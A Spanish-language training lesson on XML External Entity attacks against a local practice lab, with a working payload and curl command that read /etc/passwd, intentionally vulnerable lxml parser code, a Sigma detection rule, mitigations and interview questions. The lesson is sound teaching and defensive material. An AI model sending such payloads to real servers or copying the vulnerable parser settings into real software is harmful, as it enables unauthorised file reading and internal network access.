# 📦 XML External Entity (XXE)

### Cuando el parser de XML confía en lo que el XML le pide leer, un `<!ENTITY>` puede robar archivos del servidor y golpear servicios internos.

> **Marco de práctica.** Todo lo de esta clase se practica **solo contra objetivos autorizados** y, en concreto, contra el **lab local `vulnlab.py`** de la comunidad, que escucha en `http://127.0.0.1:5000`. Nunca contra sistemas de terceros. Leer archivos o alcanzar servicios ajenos sin permiso es un delito, no una demo.

---

## 1) Qué es y por qué importa

Muchas apps aceptan **XML** (integraciones, SOAP, SAML, facturas electrónicas, sitemaps, documentos office, feeds). El estándar de XML permite declarar **entidades**: atajos de texto que el parser expande al leer el documento. El problema aparece con las **entidades externas**, que en vez de texto apuntan a un **recurso**: un archivo del disco (`file://`) o una URL (`http://`).

Si el parser está configurado para **resolver esas entidades**, el atacante controla *qué* recurso se resuelve. Con un XML así de corto:

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

le está diciendo al servidor: "cuando expandas `&x;`, leé `/etc/passwd` y metelo acá". Si la app después refleja ese contenido, el archivo vuelve en la respuesta.

**Impacto:**
- **Lectura arbitraria de archivos** del servidor: `/etc/passwd`, claves, configuraciones, `.env`, código fuente, secretos.
- **SSRF (Server-Side Request Forgery):** apuntando la entidad a `http://` el servidor hace peticiones por vos hacia su red interna (metadata cloud `169.254.169.254`, paneles internos, etc.).
- **Denegación de servicio** (bombas de entidades tipo "billion laughs").
- En variantes ciegas, **exfiltración out-of-band** vía DTD externa.

Es una vulnerabilidad de alto impacto porque no necesita autenticación ni un bug de memoria: es **abuso de una funcionalidad legítima del parser** mal configurado.

---

## 2) Montar el lab

Instalá las dependencias y levantá el `vulnlab.py` de la comunidad:

```bash
pip install flask requests lxml pyjwt && python3 vulnlab.py
```

Queda escuchando en `http://127.0.0.1:5000`.

El endpoint de esta clase es:

```
POST /xxe
```

Recibe un cuerpo **XML** y lo parsea. Con eso alcanza para reproducir el ataque.

---

## 3) El ataque, paso a paso

Enviamos un XML que declara una entidad externa apuntando a `/etc/passwd` y luego la referencia dentro del documento.

**Comando (verificado):**

```bash
curl -s -X POST http://127.0.0.1:5000/xxe \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
```

**Output (real):**

```
root:x:0:0:root:/root:/bin/bash
...
```

La respuesta contiene el contenido de `/etc/passwd`: **leímos un archivo del servidor a través de una entidad externa**.

### Por qué funciona

El servidor parsea el XML con un parser que tiene **habilitada la resolución de entidades externas y la carga de DTD**. En código, algo equivalente a esto:

```python
from lxml import etree

# VULNERABLE: el parser resuelve entidades externas y carga DTDs
parser = etree.XMLParser(
    resolve_entities=True,   # expande &x; -> lee el recurso apuntado
    no_network=False,        # permite ir a la red (http://) -> SSRF
    load_dtd=True            # procesa el <!DOCTYPE ... [ ... ]>
)
tree = etree.fromstring(body, parser)
```

Los tres flags juntos son la falla. El **concepto reusable** es este:

> Cuando un parser de datos estructurados **resuelve referencias que apuntan a recursos** (`SYSTEM "file://..."` o `SYSTEM "http://..."`), el atacante que controla el documento controla **qué recurso se resuelve**. `file://` da **lectura de archivos**; `http://` da **SSRF**.

El payload es mínimo: `<!DOCTYPE>` abre la declaración, `<!ENTITY x SYSTEM "file:///etc/passwd">` define la entidad externa, y `<r>&x;</r>` la referencia para que su expansión termine en la salida.

---

## 4) Blue Team

### Firma de detección

En el **cuerpo** de peticiones que transportan XML, buscar la combinación de:
- `<!DOCTYPE`
- `<!ENTITY`
- `SYSTEM`
- un esquema de recurso sospechoso: `file://`, `http://`, `php://`, `gopher://`, `expect://`

Un cuerpo XML legítimo casi nunca declara entidades externas `SYSTEM`. La aparición de `<!ENTITY ... SYSTEM ...` en tráfico de producción es, por sí sola, altamente sospechosa.

### Regla Sigma

> **Nota de fuente:** esta regla inspecciona el **cuerpo** de la petición (`request_body`). Los logs de acceso de un servidor web normal **no** registran el body POST; para que la regla dispare, la fuente debe capturarlo (WAF, proxy inverso o registro de payloads habilitado). Ajustá `logsource` a tu pipeline real.

```yaml
title: Posible XXE - entidad externa SYSTEM en cuerpo XML
id: 7a1c3e42-9b8d-4f2a-a6c1-2d5e8f0b4c19
status: experimental
description: Detecta declaraciones de entidades externas (XXE) en cuerpos de peticiones XML, indicativas de lectura de archivos o SSRF.
logsource:
  category: webserver
detection:
  doctype:
    request_body|contains: '<!DOCTYPE'
  entity:
    request_body|contains: '<!ENTITY'
  external_ref:
    request_body|contains:
      - 'SYSTEM'
      - 'file://'
      - 'http://'
      - 'php://'
      - 'gopher://'
  condition: doctype and entity and external_ref
falsepositives:
  - Herramientas de testing (DAST) o pentests autorizados
  - Aplicaciones legadas que usan DTDs internas (raro)
level: high
```

### Mapeo MITRE ATT&CK

| Técnica | ID | Cómo aplica al XXE |
|---|---|---|
| Exploit Public-Facing Application | **T1190** | El endpoint XML expuesto se explota enviando entidades externas maliciosas. |

### Mitigación (el fix correcto)

| Qué | Cómo | Por qué |
|---|---|---|
| **Deshabilitar DTDs y entidades externas** | En `lxml`, crear el parser con `resolve_entities=False, no_network=True` (idealmente `load_dtd=False` y `dtd_validation=False`). | Corta la expansión de entidades y el acceso a red: sin resolución, `&x;` no lee nada. |
| **Usar una librería endurecida** | En Python, parsear con **`defusedxml`** (`defusedxml.lxml`, `defusedxml.ElementTree`). | Está diseñada para rechazar DTDs, entidades externas y bombas de entidades por defecto. |
| **Validar por esquema** | Aceptar solo XML que valide contra un **XSD/esquema** estricto y rechazar todo `<!DOCTYPE>`. | Reduce la superficie: entradas fuera de la forma esperada se descartan antes de procesarse. |
| **Preferir formatos sin entidades** | Cuando sea posible, aceptar **JSON** en vez de XML para intercambio de datos. | Elimina la clase de vulnerabilidad de raíz. |

**Fix en código:**

```python
# CORRECTO
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,   # no expande entidades
    no_network=True,          # sin acceso a red (mata el SSRF)
    load_dtd=False            # ignora el DOCTYPE/DTD
)
tree = etree.fromstring(body, parser)

# Mejor aún:
# from defusedxml.lxml import fromstring
# tree = fromstring(body)
```

---

## 5) Q&A de entrevista

**1) ¿Cuál es la diferencia entre una entidad interna y una externa, y por qué solo la externa es peligrosa?**
Una entidad interna define texto dentro del propio documento (`<!ENTITY x "hola">`) y solo sustituye ese texto. Una entidad **externa** usa la palabra clave `SYSTEM` (o `PUBLIC`) y apunta a un **recurso fuera del documento** (`file://`, `http://`). El peligro es que el parser va a **buscar ese recurso**: por eso la externa habilita lectura de archivos y SSRF, mientras la interna no sale del documento.

**2) Encontraste un endpoint XML pero la respuesta no refleja el contenido. ¿Se acabó el XXE?**
No necesariamente. Eso es **XXE ciego (blind)**. Todavía podés confirmarlo y exfiltrar datos **out-of-band**: la entidad externa hace que el servidor contacte una **DTD externa** en un servidor tuyo (`http://`), y con entidades parámetro anidadas se filtra el contenido de un archivo dentro de esa petición saliente. También sirve para SSRF puro (medís por el hit en tu servidor o por diferencias de tiempo/error).

**3) ¿Por qué el fix no es simplemente "filtrar la cadena `<!ENTITY>`" en un WAF?**
Porque el filtrado por firma es evadible: encodings alternativos, entidades PUBLIC, DTDs remotas, saltos de línea, o distintas codificaciones del documento pueden burlar el patrón. La defensa correcta es **de configuración del parser** (deshabilitar DTD y resolución de entidades) o usar **`defusedxml`**: ahí la capacidad peligrosa deja de existir y no depende de adivinar todos los payloads. El WAF es una capa extra, no el arreglo.

**4) ¿Qué relación hay entre XXE y SSRF?**
XXE es uno de los vectores clásicos para conseguir SSRF. Si la entidad externa apunta a `http://` en vez de `file://`, el **servidor** hace la petición saliente por el atacante, alcanzando su **red interna** (metadata de cloud, servicios que solo escuchan en localhost, paneles admin). Por eso el fix incluye `no_network=True`: no basta con bloquear `file://`, también hay que cortar el acceso de red del parser.